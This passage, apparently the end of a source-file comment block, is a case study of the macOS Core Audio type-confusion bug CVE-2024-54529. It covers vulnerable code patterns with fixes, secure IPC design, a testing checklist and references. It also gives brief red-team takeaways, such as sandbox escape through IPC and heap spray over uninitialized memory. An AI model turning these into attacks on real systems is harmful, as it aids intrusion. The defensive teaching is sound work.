 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                  â”‚
 *   â”‚   void HandleFooRequest(Object *obj) {                             â”‚
 *   â”‚       FooObject *foo = (FooObject *)obj;  // Assumes Foo           â”‚
 *   â”‚       foo->DoFooThings();                                          â”‚
 *   â”‚   }                                                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   FIX: Use dynamic_cast or explicit type checks                    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   PATTERN 3: Handler-ID Mismatch                                    â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                       â”‚
 *   â”‚   // Handler named "IOContext_Foo" but accepts any object ID       â”‚
 *   â”‚   // Name implies type restriction that isn't enforced             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   FIX: Handler name should match enforced type                     â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   PATTERN 4: Late Validation                                        â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                            â”‚
 *   â”‚   obj = lookup(id);                                                â”‚
 *   â”‚   x = obj->field;            // Read before validation             â”‚
 *   â”‚   if (!validate(obj)) ...    // Too late!                          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   FIX: Validate immediately after lookup, before any use           â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   PATTERN 5: Uninitialized Object Fields                            â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                   â”‚
 *   â”‚   Object::Object() {                                               â”‚
 *   â”‚       field1 = 0;                                                  â”‚
 *   â”‚       // field2 not initialized!                                   â”‚
 *   â”‚   }                                                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   FIX: Initialize all fields, use -ftrivial-auto-var-init=zero    â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * -----------------------------------------------------------------------------
 * 7.3 BUILDING SECURE IPC SERVICES
 * -----------------------------------------------------------------------------
 *
 * Best practices for building secure IPC services:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              SECURE IPC DESIGN PRINCIPLES                           â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   1. TYPED OBJECT HANDLES                                           â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                          â”‚
 *   â”‚   Instead of: uint32_t object_id;                                  â”‚
 *   â”‚   Use:        struct IOContextHandle { uint32_t id; };             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   The type system prevents passing wrong handle types.             â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   2. TYPE-SAFE LOOKUP FUNCTIONS                                     â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                    â”‚
 *   â”‚   template<typename T>                                             â”‚
 *   â”‚   T* LookupObject(uint32_t id) {                                   â”‚
 *   â”‚       Object *obj = map.lookup(id);                                â”‚
 *   â”‚       if (!obj || obj->type() != T::TYPE_CODE)                     â”‚
 *   â”‚           return nullptr;                                          â”‚
 *   â”‚       return static_cast<T*>(obj);                                 â”‚
 *   â”‚   }                                                                 â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   3. ASSERT/VALIDATE AT API BOUNDARIES                              â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                 â”‚
 *   â”‚   Every IPC handler should:                                        â”‚
 *   â”‚   â”œâ”€â”€ Validate all input sizes and counts                          â”‚
 *   â”‚   â”œâ”€â”€ Validate all object IDs and types                            â”‚
 *   â”‚   â”œâ”€â”€ Check permissions/authorization                              â”‚
 *   â”‚   â””â”€â”€ Return error for any invalid input                           â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   4. ZERO INITIALIZATION                                            â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                            â”‚
 *   â”‚   Use compiler flags to zero-init all variables:                   â”‚
 *   â”‚   -ftrivial-auto-var-init=zero  (Clang)                            â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   5. FUZZING IN CI/CD                                               â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                              â”‚
 *   â”‚   Integrate fuzzing into the build pipeline:                       â”‚
 *   â”‚   â”œâ”€â”€ OSS-Fuzz for continuous fuzzing                              â”‚
 *   â”‚   â”œâ”€â”€ libFuzzer for unit-level fuzzing                             â”‚
 *   â”‚   â””â”€â”€ Run on every commit/PR                                       â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   6. PRIVILEGE SEPARATION                                           â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                          â”‚
 *   â”‚   â”œâ”€â”€ Run service with minimal privileges                          â”‚
 *   â”‚   â”œâ”€â”€ Drop privileges after initialization                         â”‚
 *   â”‚   â”œâ”€â”€ Use sandbox profiles where possible                          â”‚
 *   â”‚   â””â”€â”€ Separate parsing from privileged operations                  â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   7. DEFENSE IN DEPTH                                               â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                             â”‚
 *   â”‚   â”œâ”€â”€ Enable all compiler hardening flags                          â”‚
 *   â”‚   â”œâ”€â”€ Use ASLR, stack canaries, CFI                                â”‚
 *   â”‚   â”œâ”€â”€ Enable PAC on Apple Silicon                                  â”‚
 *   â”‚   â””â”€â”€ Monitor for crashes and anomalies                            â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * -----------------------------------------------------------------------------
 * 7.4 SECURITY TESTING CHECKLIST FOR IPC
 * -----------------------------------------------------------------------------
 *
 * When testing IPC services, verify:
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              IPC SECURITY TESTING CHECKLIST                         â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   MESSAGE PARSING                                                   â”‚
 *   â”‚   â–¡ Malformed message headers                                      â”‚
 *   â”‚   â–¡ Invalid message sizes (too small, too large)                   â”‚
 *   â”‚   â–¡ Wrong message ID for service                                   â”‚
 *   â”‚   â–¡ Invalid descriptor counts                                      â”‚
 *   â”‚   â–¡ OOL descriptor with bad size/address                           â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   OBJECT HANDLING                                                   â”‚
 *   â”‚   â–¡ Invalid object IDs (0, -1, MAX_INT)                            â”‚
 *   â”‚   â–¡ Object IDs of wrong type                     â—€â•â• CVE-2024-54529â”‚
 *   â”‚   â–¡ Object IDs from different clients                              â”‚
 *   â”‚   â–¡ Deleted/freed object IDs                                       â”‚
 *   â”‚   â–¡ Object IDs with revoked permissions                            â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   STATE MACHINE                                                     â”‚
 *   â”‚   â–¡ Out-of-order message sequences                                 â”‚
 *   â”‚   â–¡ Repeated initialization/finalization                           â”‚
 *   â”‚   â–¡ Operations on wrong state                                      â”‚
 *   â”‚   â–¡ Concurrent operations                                          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   RESOURCE LIMITS                                                   â”‚
 *   â”‚   â–¡ Create maximum objects                                         â”‚
 *   â”‚   â–¡ Exhaust memory                                                 â”‚
 *   â”‚   â–¡ Exhaust file descriptors                                       â”‚
 *   â”‚   â–¡ Rapid create/destroy cycles                                    â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   AUTHORIZATION                                                     â”‚
 *   â”‚   â–¡ Operations without authentication                              â”‚
 *   â”‚   â–¡ Operations with wrong credentials                              â”‚
 *   â”‚   â–¡ Privilege escalation paths                                     â”‚
 *   â”‚   â–¡ Cross-client access                                            â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * -----------------------------------------------------------------------------
 * 7.5 THE BIGGER PICTURE: SECURE DEVELOPMENT LIFECYCLE
 * -----------------------------------------------------------------------------
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              SECURE DEVELOPMENT LIFECYCLE                           â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   DESIGN PHASE                                                      â”‚
 *   â”‚   â”œâ”€â”€ Threat modeling (STRIDE, Attack Trees)                       â”‚
 *   â”‚   â”œâ”€â”€ Security requirements definition                             â”‚
 *   â”‚   â”œâ”€â”€ Privilege analysis                                           â”‚
 *   â”‚   â””â”€â”€ Attack surface minimization                                  â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   IMPLEMENTATION PHASE                                              â”‚
 *   â”‚   â”œâ”€â”€ Secure coding guidelines                                     â”‚
 *   â”‚   â”œâ”€â”€ Static analysis (clang-tidy, Coverity)                       â”‚
 *   â”‚   â”œâ”€â”€ Code review with security focus                              â”‚
 *   â”‚   â””â”€â”€ Unit tests for security properties                           â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   TESTING PHASE                                                     â”‚
 *   â”‚   â”œâ”€â”€ Fuzzing (OSS-Fuzz, libFuzzer)                                â”‚
 *   â”‚   â”œâ”€â”€ Dynamic analysis (ASAN, MSAN, UBSAN)                         â”‚
 *   â”‚   â”œâ”€â”€ Penetration testing                                          â”‚
 *   â”‚   â””â”€â”€ Security-focused QA                                          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   DEPLOYMENT PHASE                                                  â”‚
 *   â”‚   â”œâ”€â”€ Hardening checklists                                         â”‚
 *   â”‚   â”œâ”€â”€ Minimal privilege configuration                              â”‚
 *   â”‚   â”œâ”€â”€ Monitoring and alerting                                      â”‚
 *   â”‚   â””â”€â”€ Incident response plan                                       â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   MAINTENANCE PHASE                                                 â”‚
 *   â”‚   â”œâ”€â”€ Continuous fuzzing                                           â”‚
 *   â”‚   â”œâ”€â”€ Dependency updates                                           â”‚
 *   â”‚   â”œâ”€â”€ Security patch process                                       â”‚
 *   â”‚   â””â”€â”€ Post-incident analysis                                       â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * -----------------------------------------------------------------------------
 * 7.6 CONCLUSION: LESSONS FROM CVE-2024-54529
 * -----------------------------------------------------------------------------
 *
 *   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 *   â”‚              KEY TAKEAWAYS                                          â”‚
 *   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
 *   â”‚                                                                     â”‚
 *   â”‚   FOR ATTACKERS/RED TEAMS:                                          â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                         â”‚
 *   â”‚   â€¢ IPC services are high-value targets for sandbox escape         â”‚
 *   â”‚   â€¢ Type confusion is powerful and often deterministic             â”‚
 *   â”‚   â€¢ Knowledge-driven fuzzing vastly improves bug discovery         â”‚
 *   â”‚   â€¢ API call chaining reaches deeper code paths                    â”‚
 *   â”‚   â€¢ Uninitialized memory can be exploited via heap spray           â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   FOR DEFENDERS/BLUE TEAMS:                                         â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                         â”‚
 *   â”‚   â€¢ Validate object types immediately after lookup                 â”‚
 *   â”‚   â€¢ Use typed handles to prevent type confusion                    â”‚
 *   â”‚   â€¢ Initialize all memory (use compiler flags)                     â”‚
 *   â”‚   â€¢ Fuzz your IPC interfaces continuously                          â”‚
 *   â”‚   â€¢ Review all CopyObjectByObjectID callers                        â”‚
 *   â”‚   â€¢ Apply defense in depth                                         â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   FOR EVERYONE:                                                     â”‚
 *   â”‚   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                    â”‚
 *   â”‚   â€¢ Security is a process, not a destination                       â”‚
 *   â”‚   â€¢ Bugs are inevitable; detection and response matter             â”‚
 *   â”‚   â€¢ Share knowledge to improve the ecosystem                       â”‚
 *   â”‚   â€¢ Responsible disclosure protects users                          â”‚
 *   â”‚                                                                     â”‚
 *   â”‚   "The goal is not to have no vulnerabilities,                     â”‚
 *   â”‚    but to find them before someone else does."                     â”‚
 *   â”‚                                                                     â”‚
 *   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 *
 * =============================================================================
 * COMPLETE REFERENCE LIST (EXPANDED)
 * =============================================================================
 *
 * PROJECT ZERO RESEARCH:
 *   https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
 *   https://projectzero.google/2026/01/sound-barrier-2.html
 *   https://googleprojectzero.blogspot.com/p/about-project-zero.html
 *
 * VULNERABILITY DATABASES:
 *   https://nvd.nist.gov/vuln/detail/CVE-2024-54529
 *   https://cwe.mitre.org/data/definitions/843.html (Type Confusion)
 *   https://support.apple.com/en-us/121839 (Apple Security Advisory)
 *
 * APPLE DOCUMENTATION:
 *   https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/WhatisCoreAudio/WhatisCoreAudio.html
 *   https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/CoreAudioEssentials/CoreAudioEssentials.html
 *
 * SECURITY RESEARCH:
 *   https://cheatsheetseries.owasp.org/cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html
 *   https://owasp.org/www-community/Fuzzing
 *   https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/index.html
 *
 * TOOLS:
 *   https://github.com/googleprojectzero/TinyInst
 *   https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz
 *   https://github.com/AFLplusplus/AFLplusplus
 *
 * RELATED VULNERABILITIES:
 *   https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
 *   https://jhftss.github.io/Endless-Exploits/
 *
 * XNU KERNEL SOURCE:
 *   https://opensource.apple.com/source/xnu/
 *
 * =============================================================================
 * END OF COMPREHENSIVE VULNERABILITY RESEARCH CASE STUDY
 * =============================================================================
 */
